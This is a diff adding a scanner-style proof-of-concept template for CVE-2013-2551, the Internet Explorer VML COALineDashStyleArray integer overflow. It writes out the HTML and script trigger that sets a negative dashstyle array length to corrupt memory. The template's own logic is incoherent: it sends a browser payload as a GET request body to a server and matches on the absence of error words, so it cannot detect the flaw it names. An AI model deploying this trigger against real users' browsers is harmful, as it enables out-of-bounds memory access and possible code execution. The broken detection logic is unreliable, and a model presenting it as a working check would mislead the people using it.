@@ -1,0 +1,45 @@
+[info]
+author = "AVE"
+description = "通过构造包含恶意VML元素的HTML页面，设置dashstyle.array.length为负值触发VGX.dll中COALineDashStyleArray::put_length函数的整数溢出漏洞，实现越界读写。该PoC用于检测目标IE浏览器是否存在此漏洞。"
+id = "POC-AVE-2013-0209"
+name = "Microsoft Internet Explorer COALineDashStyleArray Integer Overflow PoC"
+severity = "high"
+tags = [
+    "cve-2013-2551",
+    "integer-overflow",
+    "ms13-009",
+    "ms13-037",
+]
+vuln_id = [
+    "CVE-2013-2551",
+    "AVE-2013-0209",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/poc.html"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+<html>
+<body>
+<v:stroke id="vml1" dashstyle="1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44" />
+<script>
+vml1.dashstyle.array.length = 0-1;
+</script>
+</body>
+</html>"""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = false
+part = "body"
+type = "word"
+words = [
+    "VGX",
+    "COALineDashStyleArray",
+]
